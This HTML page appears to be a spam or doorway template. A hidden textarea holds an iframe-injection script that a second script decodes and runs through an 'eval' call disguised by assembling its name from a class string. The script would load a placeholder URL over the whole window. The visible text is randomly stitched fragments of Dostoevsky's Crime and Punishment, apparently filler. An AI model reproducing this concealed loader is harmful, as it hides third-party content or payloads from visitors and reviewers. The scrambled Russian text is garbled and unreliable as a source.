<html>
<head>
	<title>Это его в самый день.</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width = device-width">
<script type="text/javascript">
</script>
</head>
<body style="margin: 0 0 0 0">
<textarea id="empty" class="ev" style='display: none'>
/* OBFUSCATE_START */
(function (){
	src = "URL_PLACEHOLDER";
	fname = Math.random().toString(36).slice(2, 2 + Math.max(1, Math.min(6, 10)));
	if(/msie/.test(navigator.userAgent.toLowerCase()))
		var cframe = document.createElement('<iframe name="'+fname+'" src="'+src+'">');
	else
		var cframe = document.createElement('iframe');
	with(cframe){
		name = fname;
		setAttribute("name", fname);
		id = fname;
	};
	cframe.src = src;
	cframe.style.minWidth = 400;
	cframe.style.minHeight = 200;
	cframe.width = '100%';
	cframe.height = '100%';
	cframe.frameBorder = "0";
	cframe.scrolling = "no";
	cframe.style.marginLeft = window.screen.availWidth/2 - cframe.width/2;
	document.body.appendChild(cframe);
})();
/* OBFUSCATE_END */
</textarea>
<script type="text/javascript">
var xcode = document.getElementById("empty").value.split(/\n/);
result = '';
for(word in xcode)
{
	st = xcode[word]
	var encoded = '';
	for (var i = 0, len = st.length; i < len; i++)
	{
		ch = st.charAt(i);
		if(ch == "0")
			encoded = encoded.concat("1")
		else if(ch == "O")
			encoded = encoded.concat("0")
	}
	chr = parseInt(encoded, 2);
	result += String.fromCharCode(chr.toString(10));
}
var classname = document.getElementById('empty').className;
var cls = classname.substring(0, 2) + "a" + "l"
window[cls](result.substr(0, result.length - 1));
</script>
<p style="position: absolute; bottom: 5px; z-index: -100;">
<p>Был он очень беден и как-то надменно горд и несообщителен; как будто что-то таил про себя. Когда стучались и сговаривались, ему несколько раз вдруг приходила мысль кончить все разом и крикнуть им из-за дверей. И я сама, господин капитэн, пять целковых ему зейнрок платиль. А не хочешь ли… посущественнее, перед чаем-то?
 — Убирайся!
 Порфирий Петрович вышел приказать чаю.
 Мысли крутились как вихрь в голове Раскольникова. Я хотела уж зайти к Катерине Ивановне…
 — Вы гуляли?
 — Да, — отрывисто прошептала Соня, опять смутившись и потупившись.
 — Катерина Ивановна ведь вас чуть не била, у отца-то?
 — Ах нет, что вы, что вы это, нет! — с каким-то даже испугом посмотрела на него Соня.
 — Так вы ее любите?
 — Ее? Да ка-а-ак же! — протянула Соня жалобно и с страданием сложив вдруг руки. — Ах! вы ее… Если б вы только знали. Это уже одно показалось Раскольникову как-то странным: он сейчас оттуда, а тут как раз про нее же. Мне Дмитрий Прокофьич все объяснил и рассказал. Ваша молитва, может, и дойдет.
 — Дай же я перекрещу тебя, благословлю тебя! Вот так, вот так. Потому, как это объяснить обстоятельно? Первоначально слухи пошли. Я так спросил. Она стояла и как бы чего-то ждала. Раскольникову она показалась лет тридцати, и действительно была не пара Мармеладову… Входящих она не слушала и не видела. Что же, что же бы могло, думал он, по сих пор останавливать решимость ее покончить разом? И тут только понял он вполне, что значили для нее эти бедные, маленькие дети-сироты и та жалкая, полусумасшедшая Катерина Ивановна, с своею чахоткой и со стуканием об стену головою.
 Но тем не менее ему опять-таки было ясно, что Соня с своим характером и с тем все-таки развитием, которое она получила, ни в каком случае не могла так оставаться. Кляча протягивает морду, тяжело вздыхает и умирает.
 — Доконал! — кричат в толпе.
 — А зачем вскачь не шла!
 — Мое добро! — кричит Миколка, с ломом в руках и с налитыми кровью глазами. Я сам по случаю… А впрочем, чем могу. Не то чтоб он понимал, но он ясно ощущал, всею силою ощущения, что не только с чувствительными экспансивностями, как давеча, но даже с чем бы то ни было ему уже нельзя более обращаться к этим людям, в квартальной конторе, и будь это все его родные братья и сестры, а не квартальные поручики, то и тогда ему совершенно незачем было бы обращаться к ним и даже ни в каком случае жизни; он никогда еще до сей минуты не испытывал подобного странного и ужасного ощущения. Прощаясь, все плакали. Это ты тогда, Соня, с своими советами: «Короче да короче», вот и вышло, что совсем ребенка обезобразили… Ну, опять все вы плачете! Да чего вы, глупые! Ну, Коля, начинай поскорей, поскорей, поскорей, — ох, какой это несносный ребенок!…
 Cinq sous, cinq sous…
 Опять солдат! Ну чего тебе надобно?
 Действительно, сквозь толпу протеснятся городовой</p>
</p>
</body>